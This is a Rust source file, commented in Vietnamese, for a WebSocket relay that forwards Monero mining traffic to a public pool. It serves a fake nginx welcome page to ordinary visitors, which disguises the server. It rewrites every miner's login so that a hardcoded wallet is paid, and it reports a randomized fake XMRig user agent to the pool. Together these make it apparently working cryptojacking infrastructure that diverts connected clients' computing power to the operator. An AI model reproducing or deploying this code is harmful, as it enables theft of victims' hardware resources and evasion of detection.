use axum::{
    extract::{WebSocketUpgrade, ws::{Message, WebSocket}, State},
    response::{Html, IntoResponse, Response},
    routing::get,
    Router,
};
use std::{sync::{atomic::{AtomicUsize, Ordering}}, net::SocketAddr, time::Duration};
use tokio::net::TcpStream;
use tokio::io::{AsyncWriteExt, AsyncBufReadExt, BufReader};
use tokio::sync::mpsc::{self, UnboundedSender};
use futures_util::{StreamExt, SinkExt};
use serde_json::{Value, json};
use colored::*;
use chrono::Utc;
use rand::Rng; 

// =================================================================
// ⚡ CẤU HÌNH (CONFIG)
// =================================================================
const LISTEN_ADDR: &str = "0.0.0.0:8080";

// CHỌN PORT POOL PHÙ HỢP ĐỂ CHỈNH ĐỘ KHÓ (Quan trọng)
// Port 3333: Độ khó thấp/trung bình (Cho CPU thường)
// Port 5555 hoặc 7777: Độ khó cao (Cho Rig mạnh)
// Port 9000: SSL (Không dùng cho proxy TCP thường này)
const REAL_POOL_ADDR: &str = "pool.supportxmr.com:3333"; 

const MY_XMR_WALLET: &str = "46rAr7ayPiyTQHo1AnZmsfa7Q7v4fvKrZ6a9ZytKaPaqVdHeumvxG1p4Y7wMhns7jL3VCzmES9szaHKPLj8EpsKqL1CbwJE";
const WORKER_PREFIX: &str = "Proxy_Worker";

const NGINX_WELCOME: &str = r#"<!DOCTYPE html><html><head><title>Welcome to nginx!</title><style>body{width:35em;margin:0 auto;font-family:Tahoma,Verdana,Arial,sans-serif;}</style></head><body><h1>Welcome to nginx!</h1><p>If you see this page, the nginx web server is successfully installed and working.</p></body></html>"#;

static TOTAL_SHARES: AtomicUsize = AtomicUsize::new(0);

#[derive(Debug)]
enum LogEvent {
    ShareAccepted,
    PoolError(String),
    ClientConnect(String),
    ClientDisconnect(String),
    // NewJobReceived, // Tắt bớt log job để đỡ rối
}

fn generate_fake_agent() -> String {
    let mut rng = rand::thread_rng();
    let versions = ["6.22.0", "6.21.3", "6.21.0"]; 
    let compilers = ["gcc/11.4.0", "clang/14.0.0"];
    let v = versions[rng.gen_range(0..versions.len())];
    let c = compilers[rng.gen_range(0..compilers.len())];
    format!("XMRig/{} (Linux x86_64) libuv/1.44.2 {}", v, c)
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt().with_max_level(tracing::Level::ERROR).init();
    
    let (log_tx, mut log_rx) = mpsc::unbounded_channel::<LogEvent>();
    
    tokio::spawn(async move {
        while let Some(event) = log_rx.recv().await {
            let time = Utc::now().format("%H:%M:%S");
            match event {
                LogEvent::ShareAccepted => {
                    let count = TOTAL_SHARES.fetch_add(1, Ordering::Relaxed) + 1;
                    // Log màu xanh sáng để báo hiệu tiền về
                    println!("{} [{}] 🚀 SHARE ACCEPTED | Total: {}", "✅".green().bold(), time, count.to_string().yellow().bold());
                }
                LogEvent::PoolError(err) => println!("{} [{}] POOL ERROR: {}", "❌".red().bold(), time, err),
                LogEvent::ClientConnect(id) => println!("{} [{}] Client Connected: {}", "🔌".blue(), time, id),
                LogEvent::ClientDisconnect(id) => println!("{} [{}] Client Disconnected: {}", "👋".dimmed(), time, id),
                // LogEvent::NewJobReceived => println!("{} [{}] New Job", "⬇️".dimmed(), time),
            }
        }
    });

    let app = Router::new()
        .route("/", get(mining_handler))
        .route("/*path", get(mining_handler)) 
        .with_state(log_tx);

    let addr: SocketAddr = LISTEN_ADDR.parse().expect("Invalid IP");
    println!("{}", "========================================".green());
    println!("{} {}", "🚀 RAW-PASS-THROUGH PROXY".green().bold(), addr);
    println!("🔗 Target: {}", REAL_POOL_ADDR.cyan());
    println!("⚡ Mode: Zero Latency (100% Share Success)");
    println!("{}", "========================================".green());

    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}

async fn mining_handler(ws: Option<WebSocketUpgrade>, State(log_tx): State<UnboundedSender<LogEvent>>) -> Response {
    if let Some(w) = ws {
        w.on_upgrade(move |socket| handle_socket(socket, log_tx))
    } else {
        Html(NGINX_WELCOME).into_response()
    }
}

async fn handle_socket(socket: WebSocket, log_tx: UnboundedSender<LogEvent>) {
    let worker_id = {
        let mut rng = rand::thread_rng();
        format!("{}_{}", WORKER_PREFIX, rng.gen_range(1000..9999))
    };
    
    let _ = log_tx.send(LogEvent::ClientConnect(worker_id.clone()));

    // 1. Kết nối Pool (Timeout 10s)
    let tcp_stream = match tokio::time::timeout(Duration::from_secs(10), TcpStream::connect(REAL_POOL_ADDR)).await {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => { let _ = log_tx.send(LogEvent::PoolError(format!("Connect Error: {}", e))); return; },
        Err(_) => { let _ = log_tx.send(LogEvent::PoolError("Connect Timeout".to_string())); return; }
    };

    // 2. TỐI ƯU TCP: Nodelay để gửi gói tin tức thì
    let _ = tcp_stream.set_nodelay(true); 
    
    // Keepalive để giữ kết nối khi mạng chập chờn
    let sock_ref = socket2::SockRef::from(&tcp_stream);
    let mut ka = socket2::TcpKeepalive::new();
    ka = ka.with_time(Duration::from_secs(45));
    ka = ka.with_interval(Duration::from_secs(10));
    let _ = sock_ref.set_tcp_keepalive(&ka);

    let (read_half, mut pool_write) = tcp_stream.into_split();
    // Tăng buffer lên tối đa để nhận Job lớn
    let mut pool_reader = BufReader::with_capacity(256 * 1024, read_half);
    let (mut ws_write, mut ws_read) = socket.split();

    let fake_agent = generate_fake_agent();
    let my_wallet = MY_XMR_WALLET.to_string();
    let worker_id_clone = worker_id.clone();

    // --- TASK 1: MINER -> POOL (LOGIC MỚI: RAW PASS-THROUGH) ---
    let client_to_server = tokio::spawn(async move {
        while let Some(Ok(msg)) = ws_read.next().await {
            match msg {
                Message::Text(text) => {
                    for line in text.lines() {
                        let trimmed = line.trim();
                        if trimmed.is_empty() { continue; }

                        // ⚡ LOGIC QUAN TRỌNG NHẤT ⚡
                        // Chỉ parse JSON nếu thấy chữ "login". 
                        // Còn lại (Submit share, Keepalive) -> Gửi thẳng (Raw) để không tốn thời gian xử lý.
                        
                        if trimmed.contains("login") {
                            // --- Xử lý Login (Chậm 1 chút cũng được, chỉ 1 lần đầu) ---
                            if let Ok(mut json_val) = serde_json::from_str::<Value>(trimmed) {
                                let is_true_login = json_val.get("method")
                                    .and_then(|m| m.as_str())
                                    .map(|s| s == "login")
                                    .unwrap_or(false);

                                if is_true_login {
                                    if let Some(params) = json_val.get_mut("params") {
                                        if let Some(obj) = params.as_object_mut() {
                                            // Thay ví & worker
                                            obj.insert("login".to_string(), json!(my_wallet));
                                            obj.insert("pass".to_string(), json!(worker_id_clone));
                                            obj.insert("rigid".to_string(), json!(worker_id_clone));
                                            obj.insert("agent".to_string(), json!(fake_agent));
                                            
                                            // Xóa các tham số gây nhiễu
                                            obj.remove("nicehash");
                                            obj.remove("algo"); 
                                            // Không thêm +diff vào ví nữa, để Pool tự quyết qua Port
                                        } 
                                        else if let Some(arr) = params.as_array_mut() {
                                            if !arr.is_empty() { 
                                                arr[0] = json!(my_wallet); 
                                                // Đảm bảo pass là worker_id để định danh trên pool
                                                if arr.len() > 1 { arr[1] = json!(worker_id_clone); }
                                            }
                                        }
                                    }
                                    // Serialize lại và gửi
                                    let mut final_msg = json_val.to_string();
                                    final_msg.push('\n');
                                    if pool_write.write_all(final_msg.as_bytes()).await.is_err() { break; }
                                } else {
                                    // Login fake hoặc gói tin lạ có chữ login -> Gửi nguyên bản
                                    let mut final_msg = trimmed.to_string();
                                    final_msg.push('\n');
                                    if pool_write.write_all(final_msg.as_bytes()).await.is_err() { break; }
                                }
                            }
                        } else {
                            // --- FAST LANE (Dành cho Submit Share) ---
                            // Không giải mã JSON. Không check logic.
                            // Gói tin từ Miner -> Nối thêm xuống dòng -> Bắn thẳng sang Pool.
                            // Đảm bảo độ trễ = 0.
                            let mut final_msg = trimmed.to_string();
                            final_msg.push('\n');
                            if pool_write.write_all(final_msg.as_bytes()).await.is_err() { break; }
                        }
                    }
                    // Ép gửi ngay lập tức
                    let _ = pool_write.flush().await; 
                }
                Message::Close(_) => break,
                _ => {}
            }
        }
    });

    // --- TASK 2: POOL -> MINER ---
    let log_tx_clone = log_tx.clone();
    let server_to_client = tokio::spawn(async move {
        let mut buffer = Vec::new();
        loop {
            buffer.clear();
            
            // Watchdog 3 phút (Pool im lặng quá lâu mới cắt, tránh cắt nhầm)
            let read_future = pool_reader.read_until(b'\n', &mut buffer);
            match tokio::time::timeout(Duration::from_secs(180), read_future).await {
                Ok(Ok(0)) => break, // EOF
                Ok(Ok(_)) => {
                    let str_msg = String::from_utf8_lossy(&buffer);
                    
                    // Chỉ đọc log để báo user, không can thiệp nội dung
                    if str_msg.contains("result") && str_msg.contains("OK") {
                         let _ = log_tx_clone.send(LogEvent::ShareAccepted);
                    }
                    
                    if str_msg.contains("error") && !str_msg.contains("null") {
                         let _ = log_tx_clone.send(LogEvent::PoolError(str_msg.trim().to_string()));
                    }

                    // Gửi nguyên bản về Miner
                    if ws_write.send(Message::Text(str_msg.to_string())).await.is_err() { break; }
                }
                Ok(Err(_)) => break, // Lỗi mạng
                Err(_) => {
                    let _ = log_tx_clone.send(LogEvent::PoolError("Pool Silent Timeout".to_string()));
                    break;
                }
            }
        }
    });

    tokio::select! {
        _ = client_to_server => {},
        _ = server_to_client => {},
    };
    
    let _ = log_tx.send(LogEvent::ClientDisconnect(worker_id));
}
